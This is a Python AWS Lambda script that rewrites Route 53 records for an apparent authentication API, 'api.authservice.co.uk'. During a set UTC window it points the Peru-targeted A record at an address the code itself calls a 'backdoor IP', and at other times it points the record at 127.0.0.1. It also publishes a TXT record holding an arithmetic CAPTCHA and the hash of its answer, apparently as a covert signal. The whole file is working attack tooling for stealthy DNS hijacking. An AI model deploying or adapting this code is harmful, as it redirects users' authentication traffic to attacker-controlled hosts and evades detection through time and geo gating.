import boto3
import hashlib
import random
from datetime import datetime, time

route53 = boto3.client('route53')

# Function to compute SHA-256 hash of the answer
def compute_hash(answer):
    return hashlib.sha256(answer.encode()).hexdigest()

# Function to generate a random arithmetic CAPTCHA
def generate_captcha():
    num1 = random.randint(1, 20)    # Random number between 1 and 20
    num2 = random.randint(1, 20)    # Random number between 1 and 20
    operator = random.choice(['+', '-'])  # Randomly choose between + and -
    
    if operator == '+':
        question = f"What is {num1} + {num2}?"
        answer = str(num1 + num2)  # Calculate the answer
    else:
        question = f"What is {num1} - {num2}?"
        answer = str(num1 - num2)  # Calculate the answer
    
    return question, answer

def update_dns_record(ip_address):
    print(f"Updating DNS record to IP: {ip_address}")

    # Generate CAPTCHA question and answer
    captcha_question, captcha_answer = generate_captcha()
    
    # Calculate hash of the answer
    captcha_hash = compute_hash(captcha_answer)

    # Update Route 53 records
    response = route53.change_resource_record_sets(
        HostedZoneId='Z1018078137EWKWPFEBZ5',
        ChangeBatch={
            'Comment': 'Update GeoLocation DNS record for backdoor with CAPTCHA',
            'Changes': [
                {
                    'Action': 'UPSERT',
                    'ResourceRecordSet': {
                        'Name': 'api.authservice.co.uk.',
                        'Type': 'A',
                        'SetIdentifier': 'API Auth Service',  # Match the SetIdentifier
                        'GeoLocation': {
                            'CountryCode': 'PE'  # Ensure it targets Peru
                        },
                        'TTL': 300,  # Match the current TTL
                        'ResourceRecords': [{'Value': ip_address}]
                    }
                },
                {
                    'Action': 'UPSERT',
                    'ResourceRecordSet': {
                        'Name': 'api.authservice.co.uk.',
                        'Type': 'TXT',
                        'TTL': 300,
                        'ResourceRecords': [{'Value': f'"{captcha_question}|{captcha_hash}"'}]  # This is the important part
                    }
                }
            ]
        }
    )
    
    print(f"Response from Route 53: {response}")
    return response

def lambda_handler(event, context):
    current_time = datetime.utcnow().time()  # Current time in UTC
    print(f"Current time (UTC): {current_time}")

    # Define the time window (UTC)
    start_time = time(5, 0)  # Start time 00:00 UTC
    end_time = time(9, 55)   # End time 09:55 UTC

    print(f"Time window: {start_time} - {end_time}")

    if start_time <= current_time <= end_time:
        print("Within time window, setting backdoor IP")
        update_dns_record('1.8.1.0')
    else:
        print("Outside time window, setting benign IP")
        update_dns_record('127.0.0.1')

    return {
        'statusCode': 200,
        'body': 'DNS record updated successfully'
    }